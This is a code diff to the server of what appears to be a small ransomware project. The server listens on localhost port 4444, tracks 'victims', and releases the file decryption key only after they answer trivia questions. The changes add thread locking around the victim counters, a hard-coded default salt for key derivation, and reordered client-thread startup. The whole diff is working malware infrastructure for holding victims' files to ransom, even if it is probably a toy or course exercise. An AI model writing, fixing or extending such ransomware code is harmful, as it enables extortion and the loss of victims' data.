@@ -9,8 +9,10 @@ import enum
 HOST = "127.0.0.1"
 PORT = 4444
 COMMANDS_PORT = 4445
+DEFAULT_SALT = b'default_salt_16b'
 CLIENT_HANDLER_THREADS = list()
 CLIENT_SOCKETS = list()
+MUTEX_LOCK = threading.Lock()
 
 QUESTIONS = {
     "What is the capital of France?": "Paris",
@@ -31,12 +33,14 @@ VICTIM_CORRECT_ANSWERS_COUNTER = {}
 
 def verify_answers(question: str, answer: str, victim_addr) -> bool:
     global VICTIM_CORRECT_ANSWERS_COUNTER
+    global MUTEX_LOCK
     if victim_addr not in VICTIM_CORRECT_ANSWERS_COUNTER:
         print("Victim address not found in correct answers dictionary.")
         return False
     
     if question in QUESTIONS and QUESTIONS[question].lower() == answer.lower():
-        VICTIM_CORRECT_ANSWERS_COUNTER[victim_addr] += 1
+        with MUTEX_LOCK:
+            VICTIM_CORRECT_ANSWERS_COUNTER[victim_addr] += 1
         print(f"Victim {victim_addr} answered correctly. Total correct answers: {VICTIM_CORRECT_ANSWERS_COUNTER[victim_addr]}")
         return True
     return False
@@ -77,13 +81,14 @@ def handle_client(client_socket: socket, key: bytes, salt: bytes):
                 client_socket.send(payload)
             elif request.startswith(Requests.REQUEST_DECRYPTION_KEY.value):
                 print("Received request for decryption key")
-                if VICTIM_CORRECT_ANSWERS_COUNTER.get(client_socket.getpeername(), 0) >= len(QUESTIONS):
-                    print("Sending the decryption key")
-                    payload = base64.b64encode(key) + b"::" + base64.b64encode(salt)
-                    client_socket.send(payload)
-                else:
-                    print("Someone tried to request the decryption key without completing the minigame")
-                    client_socket.send(Requests.NOT_ENOUGH_CORRECT_ANSWERS.value.encode())
+                with MUTEX_LOCK:
+                    if VICTIM_CORRECT_ANSWERS_COUNTER.get(client_socket.getpeername(), 0) >= len(QUESTIONS):
+                        print("Sending the decryption key")
+                        payload = base64.b64encode(key) + b"::" + base64.b64encode(salt)
+                        client_socket.send(payload)
+                    else:
+                        print("Someone tried to request the decryption key without completing the minigame")
+                        client_socket.send(Requests.NOT_ENOUGH_CORRECT_ANSWERS.value.encode())
             elif request.startswith(Requests.EXIT.value):
                 print(f"Client {client_socket.getpeername()} requested to exit. (His loss :D)")
                 break
@@ -133,7 +138,7 @@ def main():
 
     #generate encryption key
     user_input = input("Enter encryption password for the victims: ")
-    key, salt = generate_key_from_password(user_input)
+    key, salt = generate_key_from_password(user_input, DEFAULT_SALT)
 
     instruction_handler_thread = threading.Thread(target=instruction_handler)
     instruction_handler_thread.start()
@@ -150,9 +155,9 @@ def main():
             client_socket, addr = server_socket.accept()
             print(f"Connection from {addr}")
 
-            CLIENT_HANDLER_THREADS.append(threading.Thread(target=handle_client, args=(client_socket,key, salt)))
-            CLIENT_HANDLER_THREADS[-1].start()
             VICTIM_CORRECT_ANSWERS_COUNTER[addr] = 0
+            CLIENT_HANDLER_THREADS.append(threading.Thread(target=handle_client, args=(client_socket, key, salt)))
+            CLIENT_HANDLER_THREADS[-1].start()
     
     except Exception as e:
         print("Exception: " + str(e))
